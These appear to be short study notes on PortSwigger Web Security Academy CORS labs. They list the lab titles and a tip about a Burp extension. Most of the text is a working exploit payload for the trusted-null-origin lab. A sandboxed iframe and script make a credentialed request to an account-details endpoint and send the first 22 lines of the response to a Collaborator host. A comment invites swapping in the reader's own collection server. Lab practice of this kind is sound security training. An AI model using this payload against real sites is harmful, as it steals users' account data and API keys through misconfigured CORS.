>Tip: Make sure the ParamMiner burp extension is turned off before testing for and exploiting CORS.

- CORS vulnerability with basic origin reflection
- **_CORS vulnerability with trusted null origin_**

Special Code that returns the first 22 lines of the response (When Access-Control-Allow-Credentials: true) :-
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="about:blank" id="responseFrame"></iframe>`
`<script>
var req = new XMLHttpRequest();
req.open('get', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.onreadystatechange = function() {
if (req.readyState === 4 && req.status === 200) {
var lines = req.responseText.split('\n');
var firstTenLines = lines.slice(0, 22).join('\n');
// Modify the URL below to the actual server where you want to send the data
var serverURL = 'https://COLLAB-ID.oastify.com/log?key=';
var frame = document.getElementById('responseFrame');
frame.src = serverURL + encodeURIComponent(firstTenLines);
}
};
req.send();
</script>
```

- CORS vulnerability with trusted insecure protocols
- CORS vulnerability with internal network pivot attack


